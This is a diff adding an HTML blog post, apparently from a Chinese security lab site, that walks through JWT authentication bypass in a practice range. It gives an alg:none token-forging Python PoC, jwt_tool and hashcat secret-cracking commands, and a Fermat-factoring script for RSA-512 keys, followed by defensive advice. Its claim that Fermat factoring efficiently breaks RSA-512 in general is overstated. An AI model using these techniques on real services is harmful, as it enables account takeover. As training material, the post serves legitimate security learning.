@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT认证绕过全链路 — DARKSEC</title>
+<meta name="description" content="深入分析JWT认证体系中的多个致命弱点，从alg:none到RSA-512 Fermat分解">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 认证绕过 / 靶场实战</div>
+        <h1>JWT认证绕过全链路：从alg:none到RSA-512分解</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-14</span>
+          <span>⏱ 15 min read</span>
+          <span>🏷 JWT / 认证绕过</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">概述</a></li>
+            <li><a href="#recon">信息收集</a></li>
+            <li><a href="#alg-none">alg:none 绕过</a></li>
+            <li><a href="#weak-secret">弱密钥爆破</a></li>
+            <li><a href="#rsa512">RSA-512 分解</a></li>
+            <li><a href="#exploit">完整利用链</a></li>
+            <li><a href="#defense">防御建议</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">概述</h2>
+        <p>JWT（JSON Web Token）是现代Web应用中最常见的认证机制之一。然而，其设计和实现中存在多个致命弱点，攻击者可以利用这些弱点绕过认证，甚至完全接管账户。</p>
+        <p>本文基于黑域护航靶场的实战经验，完整复现JWT认证绕过的全链路攻击。</p>
+
+        <blockquote>
+          <p>⚠️ 本文仅供安全研究和学习使用，请勿用于非法用途。</p>
+        </blockquote>
+
+        <h2 id="recon">信息收集</h2>
+        <p>在开始攻击之前，首先需要了解目标的JWT实现方式：</p>
+        <ul>
+          <li>检查JWT的Header部分，确认<code>alg</code>字段值</li>
+          <li>分析Payload结构，了解用户信息和权限</li>
+          <li>测试是否存在alg:none漏洞</li>
+          <li>尝试弱密钥爆破</li>
+        </ul>
+
+        <h3>JWT结构分析</h3>
+        <p>一个标准的JWT由三部分组成，用<code>.</code>分隔：</p>
+        <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>
+        <p>解码后可以看到：</p>
+        <pre><code>// Header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+// Payload
+{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "iat": 1516239022
+}</code></pre>
+
+        <h2 id="alg-none">alg:none 绕过</h2>
+        <p>最经典的JWT绕过方式。当服务器接受<code>alg:none</code>时，攻击者可以伪造任意JWT而无需密钥。</p>
+
+        <h3>攻击步骤</h3>
+        <ol>
+          <li>获取一个有效的JWT token</li>
+          <li>修改Header中的<code>alg</code>为<code>none</code></li>
+          <li>修改Payload中的用户信息（如将<code>role</code>改为<code>admin</code>）</li>
+          <li>删除签名部分（最后一个<code>.</code>后的内容）</li>
+          <li>发送修改后的token</li>
+        </ol>
+
+        <h3>PoC</h3>
+        <pre><code>import base64
+import json
+
+# 原始token
+token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxxxx"
+
+# 解码Header和Payload
+header = json.loads(base64.urlsafe_b64decode("eyJhbGciOiJIUzI1NiJ9=="))
+payload = json.loads(base64.urlsafe_b64decode("eyJ1c2VyIjoiZ3Vlc3QifQ=="))
+
+# 修改alg为none
+header["alg"] = "none"
+
+# 修改用户为admin
+payload["user"] = "admin"
+payload["role"] = "admin"
+
+# 重新编码
+new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
+new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
+
+# 构造新token (无签名)
+new_token = f"{new_header}.{new_payload}."
+print(f"Forged token: {new_token}")</code></pre>
+
+        <h2 id="weak-secret">弱密钥爆破</h2>
+        <p>当服务器使用弱密钥时，可以通过字典攻击破解JWT签名。</p>
+
+        <h3>工具推荐</h3>
+        <ul>
+          <li><strong>jwt_tool</strong> - 功能最全面的JWT攻击工具</li>
+          <li><strong>hashcat</strong> - 高性能密码破解</li>
+          <li><strong>john</strong> - John the Ripper</li>
+        </ul>
+
+        <h3>爆破命令</h3>
+        <pre><code># 使用jwt_tool爆破
+python3 jwt_tool.py &lt;JWT_TOKEN&gt; -C -d /path/to/wordlist.txt
+
+# 使用hashcat
+hashcat -m 16500 jwt.txt wordlist.txt</code></pre>
+
+        <h2 id="rsa512">RSA-512 分解</h2>
+        <p>当JWT使用RSA算法但密钥长度过短（如RSA-512）时，可以通过数学方法分解模数N，获取私钥。</p>
+
+        <h3>攻击原理</h3>
+        <p>RSA-512的模数N只有512位，在现代计算能力下可以被分解。使用Fermat分解算法可以高效地找到P和Q。</p>
+
+        <pre><code>from sympy import factorint
+import gmpy2
+
+# RSA-512 模数 (示例)
+N = 0xbaa5501074a512345...
+
+# 使用Fermat分解
+def fermat_factor(n):
+    a = gmpy2.isqrt(n) + 1
+    b2 = a * a - n
+    while not gmpy2.is_square(b2):
+        a += 1
+        b2 = a * a - n
+    b = gmpy2.isqrt(b2)
+    return a - b, a + b
+
+p, q = fermat_factor(N)
+print(f"P = {p}")
+print(f"Q = {q}")</code></pre>
+
+        <h2 id="exploit">完整利用链</h2>
+        <p>在黑域护航靶场中，完整的攻击链如下：</p>
+        <ol>
+          <li><strong>信息收集</strong>：发现JWT使用RSA-256算法，但密钥长度未知</li>
+          <li><strong>密钥获取</strong>：通过<code>/jwks.json</code>端点获取公钥</li>
+          <li><strong>密钥分析</strong>：发现N只有512位，可以分解</li>
+          <li><strong>密钥分解</strong>：使用Fermat分解获取P和Q</li>
+          <li><strong>私钥生成</strong>：计算私钥d</li>
+          <li><strong>Token伪造</strong>：使用私钥签发管理员token</li>
+          <li><strong>权限获取</strong>：访问管理后台获取flag</li>
+        </ol>
+
+        <h2 id="defense">防御建议</h2>
+        <ul>
+          <li>禁止使用<code>alg:none</code></li>
+          <li>使用强密钥（RSA-2048以上，HS256密钥长度>256位）</li>
+          <li>验证JWT的<code>iss</code>、<code>aud</code>、<code>exp</code>等声明</li>
+          <li>使用最新的JWT库，避免自行实现</li>
+          <li>定期轮换密钥</li>
+        </ul>
+
+        <div class="article-tags">
+          <span class="tag pink">JWT</span>
+          <span class="tag">认证绕过</span>
+          <span class="tag purple">RSA</span>
+          <span class="tag yellow">靶场实战</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+      <p class="quote">「 漏洞不会消失，只会转移 」</p>
+      <div class="links">
+        <a href="https://github.com/YOUR_USERNAME" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="/rss.xml">RSS</a>
+        <span>·</span>
+        <a href="mailto:your@email.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
